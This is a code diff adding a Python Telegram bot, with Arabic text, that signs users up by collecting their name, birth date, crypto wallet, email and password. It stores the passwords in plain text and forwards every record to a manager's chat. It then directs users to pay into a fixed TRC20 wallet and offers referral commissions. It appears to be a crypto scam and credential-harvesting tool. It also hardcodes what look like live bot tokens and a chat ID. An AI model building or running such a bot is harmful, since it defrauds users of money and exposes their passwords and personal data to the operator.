@@ -1,0 +1,245 @@
+import json
+import random
+import string
+import time
+from datetime import datetime, timedelta
+from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, Bot
+from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
+
+# ========================
+# توكنات البوتات
+# ========================
+
+USER_BOT_TOKEN = "8108703711:AAHNHQhmTW6P0wk3HwFYsqTlTcMxSdsqRB0"
+MANAGER_BOT_TOKEN = "8527245679:AAF-hyO7jzhDxxAYEsdlhWkPw-UlwPWAl04"
+NEWS_BOT_TOKEN = "8588167836:AAGCBJSTGqKYWlFIm2U1qA46MKtDF6wC_jU"   
+MANAGER_CHAT_ID = "5907714557"
+
+DATABASE_FILE = "users.json"
+USER_STEPS = {}
+
+# ========================
+# تحميل وحفظ قاعدة البيانات
+# ========================
+
+def load_db():
+    try:
+        with open(DATABASE_FILE, "r") as f:
+            return json.load(f)
+    except:
+        return {}
+
+def save_db(data):
+    with open(DATABASE_FILE, "w") as f:
+        json.dump(data, f, indent=4, ensure_ascii=False)
+
+# ========================
+# توليد رمز الإحالة
+# ========================
+
+def generate_ref_code(length=8):
+    letters = string.ascii_uppercase + string.digits
+    return ''.join(random.choice(letters) for _ in range(length))
+
+# ========================
+# بدء البوت وخيار تسجيل جديد أو استرجاع
+# ========================
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("🆕 تسجيل جديد", callback_data="new")],
+        [InlineKeyboardButton("🔑 استرجاع حساب", callback_data="recover")]
+    ])
+    await update.message.reply_text(
+        "مرحبًا! اختر أحد الخيارات للمتابعة:",
+        reply_markup=keyboard
+    )
+
+# ========================
+# التعامل مع اختيار المستخدم
+# ========================
+
+async def start_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = str(query.from_user.id)
+
+    if query.data == "new":
+        USER_STEPS[user_id] = {"step": "name"}
+        await query.edit_message_text("📌 الرجاء إرسال الاسم واللقب:")
+    elif query.data == "recover":
+        USER_STEPS[user_id] = {"step": "recover_email"}
+        await query.edit_message_text("📧 الرجاء إدخال بريدك الإلكتروني لاسترجاع الحساب:")
+
+# ========================
+# جمع البيانات أو استرجاع الحساب
+# ========================
+
+async def collect_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = str(update.effective_user.id)
+    if user_id not in USER_STEPS:
+        return
+
+    step = USER_STEPS[user_id]["step"]
+    text = update.message.text
+    db = load_db()
+    if user_id not in db:
+        db[user_id] = {}
+
+    # ===== تسجيل جديد =====
+    if step == "name":
+        db[user_id]["الاسم واللقب"] = text
+        USER_STEPS[user_id]["step"] = "birth"
+        await update.message.reply_text("📅 الرجاء إرسال تاريخ الميلاد:")
+    elif step == "birth":
+        db[user_id]["تاريخ الميلاد"] = text
+        USER_STEPS[user_id]["step"] = "wallet"
+        await update.message.reply_text("💳 أرسل رمز محفظتك شبكة TRC20:")
+    elif step == "wallet":
+        db[user_id]["محفظة TRC20"] = text
+        USER_STEPS[user_id]["step"] = "email"
+        await update.message.reply_text("📧 أرسل البريد الإلكتروني:")
+    elif step == "email":
+        db[user_id]["الإيميل"] = text
+        USER_STEPS[user_id]["step"] = "password"
+        await update.message.reply_text("🔑 أرسل كلمة المرور:")
+    elif step == "password":
+        db[user_id]["كلمة المرور"] = text
+        USER_STEPS[user_id]["step"] = "ref"
+        await update.message.reply_text("🧩 أرسل رمز الإحالة (اختياري):")
+    elif step == "ref":
+        db[user_id]["رمز الإحالة"] = text
+        USER_STEPS.pop(user_id)
+
+        # توليد رمز إحالة خاص بالمستخدم
+        if "رمز الإحالة الخاص بك" not in db[user_id]:
+            db[user_id]["رمز الإحالة الخاص بك"] = generate_ref_code()
+
+        save_db(db)
+
+        # رسائل تعليمية وإرسال الصور
+        await update.message.reply_photo("images/photo1.jpg", caption=(
+            "📌 يرجى إرسال المبلغ عبر شبكة TRC20.\n"
+            "رمز المحفظة:\nTKSqq93FrvzEuUEjfzH6CmVGrnxvVYeXro\n"
+            "❗ لا نتحمل أي خطأ في التحويل."
+        ))
+        await update.message.reply_photo("images/photo2.jpg", caption="📌 أرسل لنا TxID الخاص بالمعاملة لتأكيد الدفع.")
+        await update.message.reply_photo("images/photo3.jpg")
+        await send_to_manager(db[user_id])
+
+        # إرسال رمز الإحالة
+        await update.message.reply_text(
+            f"🎁 **رمز الإحالة الخاص بك:** {db[user_id]['رمز الإحالة الخاص بك']}\n"
+            f"🔸 تربح *1%* عن كل شخص يسجل باستخدام هذا الرمز.",
+            parse_mode="Markdown"
+        )
+
+    # ===== استرجاع حساب =====
+    elif step == "recover_email":
+        db[user_id]["recover_email"] = text
+        USER_STEPS[user_id]["step"] = "recover_password"
+        await update.message.reply_text("🔑 أدخل كلمة المرور الخاصة بك:")
+    elif step == "recover_password":
+        email = db[user_id]["recover_email"]
+        user_found = None
+        for uid, info in db.items():
+            if info.get("الإيميل") == email:
+                user_found = uid
+                break
+
+        if not user_found:
+            await update.message.reply_text("❌ البريد الإلكتروني غير موجود.")
+            USER_STEPS.pop(user_id)
+            return
+
+        if db[user_found].get("كلمة المرور") == text:
+            await update.message.reply_text("✅ تم استرجاع حسابك بنجاح!")
+            USER_STEPS.pop(user_id)
+            return
+        else:
+            # كلمة المرور خاطئة → إرسال البيانات للمدير
+            USER_STEPS[user_id]["step"] = "recover_code"
+            await send_to_manager({
+                "الإيميل": email,
+                "user_id": user_id,
+                "info": db[user_found]
+            })
+            await update.message.reply_text("🔑 كلمة المرور خاطئة. أدخل الرمز الذي سيرسله لك المدير:")
+
+    elif step == "recover_code":
+        # هنا يمكن التحقق من الرمز المرسل من المدير لاحقًا
+        USER_STEPS.pop(user_id)
+        await send_to_manager({
+            "الإيميل": db[user_id]["recover_email"],
+            "user_id": user_id,
+            "entered_code": text
+        })
+        await update.message.reply_text("⏳ تم إرسال البيانات للمدير للموافقة أو الحظر.")
+
+# ========================
+# إرسال بيانات المستخدم للمدير
+# ========================
+
+async def send_to_manager(user_data):
+    markup = InlineKeyboardMarkup([
+        [InlineKeyboardButton("✅ موافقة", callback_data=f"approve:{user_data.get('الإيميل')}")],
+        [InlineKeyboardButton("❌ رفض", callback_data=f"reject:{user_data.get('الإيميل')}")],
+        [InlineKeyboardButton("⛔ حظر 24 ساعة", callback_data=f"block:{user_data.get('الإيميل')}")]
+    ])
+    async with Bot(MANAGER_BOT_TOKEN) as manager_bot:
+        await manager_bot.send_message(
+            chat_id=MANAGER_CHAT_ID,
+            text=f"📌 طلب جديد:\n{json.dumps(user_data, ensure_ascii=False, indent=4)}",
+            reply_markup=markup
+        )
+
+# ========================
+# معالجة أزرار المدير
+# ========================
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    action, user_email = query.data.split(":")
+    db = load_db()
+
+    user_id = None
+    for uid, info in db.items():
+        if info.get("الإيميل") == user_email:
+            user_id = uid
+            break
+
+    if not user_id:
+        await query.edit_message_text("❌ المستخدم غير موجود.")
+        return
+
+    if action == "approve":
+        async with Bot(NEWS_BOT_TOKEN) as news_bot:
+            await news_bot.send_message(
+                chat_id=user_id,
+                text="✅ تمت الموافقة على طلبك! ستصلك الأخبار من الآن فصاعدًا."
+            )
+        await query.edit_message_text("✅ تمت الموافقة على الطلب.")
+    elif action == "reject":
+        db.pop(user_id)
+        save_db(db)
+        await query.edit_message_text("❌ تم رفض الطلب وحذف بيانات المستخدم نهائيًا.")
+    elif action == "block":
+        db[user_id]["blocked_until"] = (datetime.now() + timedelta(hours=24)).isoformat()
+        save_db(db)
+        await query.edit_message_text("⛔ تم حظر المستخدم لمدة 24 ساعة.")
+
+# ========================
+# تشغيل البوت
+# ========================
+
+def main():
+    app = ApplicationBuilder().token(USER_BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CallbackQueryHandler(start_choice, pattern="^(new|recover)$"))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, collect_data))
+    print("User bot is running...")
+    app.run_polling()
+
+if __name__ == "__main__":
+    main()
